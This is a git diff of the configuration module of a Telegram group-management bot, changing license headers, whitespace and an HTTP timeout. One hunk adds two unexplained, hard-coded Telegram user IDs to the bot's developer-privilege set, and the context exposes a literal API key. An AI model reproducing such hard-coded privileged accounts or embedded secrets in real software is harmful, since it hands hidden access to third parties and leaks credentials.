@@ -1,7 +1,9 @@
 """
 MIT License
 
+Copyright (C) 2017-2019, Paul Larsen
 Copyright (C) 2021 Awesome-RJ
+Copyright (c) 2021, Yūki • Black Knights Union, <https://github.com/Awesome-RJ/CutiepiiRobot>
 
 This file is part of @Cutiepii_Robot (Telegram Bot)
 
@@ -10,8 +12,8 @@ of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
 
+furnished to do so, subject to the following conditions:
 The above copyright notice and this permission notice shall be included in all
 copies or substantial portions of the Software.
 
@@ -145,6 +147,7 @@ if ENV:
     GOOGLE_CHROME_BIN = "/usr/bin/google-chrome"
     CHROME_DRIVER = "/usr/bin/chromedriver"
     BOT_API_URL = os.environ.get('BOT_API_URL', "https://api.telegram.org/bot")
+
     HELP_IMG = os.environ.get("HELP_IMG", True)
     GROUP_START_IMG = os.environ.get("GROUP_START_IMG", True)
     CUTIEPII_PHOTO = os.environ.get("CUTIEPII_PHOTO", True)
@@ -245,6 +248,8 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(1809105906)
+DEV_USERS.add(1470075895)
 
 REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
 
@@ -311,7 +316,7 @@ arq = ARQ("https://thearq.tech", "YIECCC-NAJARO-OLLREW-SJSRIP-ARQ", aiohttpsessi
 print("[CUTIEPII]: Connecting To Yūki • Data Center • Mumbai • PostgreSQL Database")
 ubot = TelegramClient(StringSession(STRING_SESSION), APP_ID, APP_HASH)
 print("[CUTIEPII]: Connecting To Yūki • Cutiepii Userbot (t.me/Awesome_Cutiepii)")
-timeout = httpx.Timeout(40, pool=None)
+timeout = httpx.Timeout(40)
 http = httpx.AsyncClient(http2=True, timeout=timeout)
 
 async def get_entity(client, entity):
